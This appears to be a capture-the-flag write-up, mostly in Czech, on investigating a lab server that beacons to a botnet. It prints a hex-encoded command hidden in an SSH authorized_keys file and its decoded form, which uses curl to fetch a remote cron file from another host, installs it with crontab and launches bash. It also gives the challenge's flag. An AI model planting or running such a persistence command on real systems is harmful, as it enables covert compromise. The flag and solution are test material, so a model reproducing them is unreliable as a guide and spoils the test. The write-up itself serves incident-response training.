# Leonidas (2)

## Zadání

Hi, TCC-CSIRT analyst,

some suspicious communication between the device srv-test23.cypherfix.tcc (10.99.24.23, 2001:db8:7cc::24:23) in our constituency and the C2 botnet Leonidas300 has started appearing in our IDS. The user and device administrator in one person has no idea how this is possible but refuses to turn off the important testing device (as a VIP, he evidently can afford to complicate the investigation). However, he is willing to provide ssh key for a test user to examine the device.

Your task is to analyze the incident and determine what is happening on the device, mainly what causes the occasional detection of botnet communication.

* [Download the ssh key for user 'testuser'](ssh_key.zip)
 (sha256 checksum: `e5d56147ea7f2c38a01a09ec144e7daba49232167e272da99f6d33af8d672397`)
* The device is available at `srv-test23.cypherfix.tcc`.
* The IDS interface is available at <http://ids.cypherfix.tcc>.

See you in the next incident!

## Nápovědy (Hints)

1. The filesystem has been turned to read-only.
1. IDS evaluate new events each minute and show data 60 minutes to the past.

## Řešení

Stažený ZIP soubor obsahuje privátní SSH klíč.

Skenování portů `nmap srv-test23.cypherfix.tcc -p-` se zobrazí jediný otevřený port.

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

Použijeme privátní klíč ze ZIP archivu a připojíme se pomocí SSH k serveru.

`ssh -i testuser testuser@srv-test23.cypherfix.tcc`

Na IDS portálu se objeví záznam při každém přihlášení k SSH serveru s IP adresou 10.99.24.23, což je IP adresa srv-test23.cypherfix.tcc.

V souboru `.ssh/authorized_keys` je zajímavý text.

```text
echo 6375726c202d73202d4120274c656f6e69646173212049206861766520707265706172656420627265616b6661737420616e6420617465206865617274696c792e2e2e20466f7220746f6e696768742c2077652064696e6520696e2068656c6c2121205530633564324a48624442615657784655465661545646565a44645a5747513057564d784e4531556248424d565752445932706a64475177526b7057626a41392720687474703a2f2f31302e39392e32342e32343a38302f2e63726f6e202d6f202e63726f6e3b2063726f6e746162202e63726f6e20323e202f6465762f6e756c6c3b2f62696e2f62617368 | xxd -r -ps
```

který se dekóduje na

```text
curl -s -A 'Leonidas! I have prepared breakfast and ate heartily... For tonight, we dine in hell!! U0c5d2JHbDBaVWxFUFVaTVFVZDdZWGQ0WVMxNE1UbHBMVWRDY2pjdGQwRkpWbjA9' http://10.99.24.24:80/.cron -o .cron; crontab .cron 2> /dev/null;/bin/bash
```

Z řetězce `U0c5d2JHbDBaVWxFUFVaTVFVZDdZWGQ0WVMxNE1UbHBMVWRDY2pjdGQwRkpWbjA9` po dekódování pomocí Base64 získáme další Base64 řetězec `SG9wbGl0ZUlEPUZMQUd7YXd4YS14MTlpLUdCcjctd0FJVn0=` a po jeho dekódování získáme FLAG.

## Flag

`FLAG{awxa-x19i-GBr7-wAIV}`
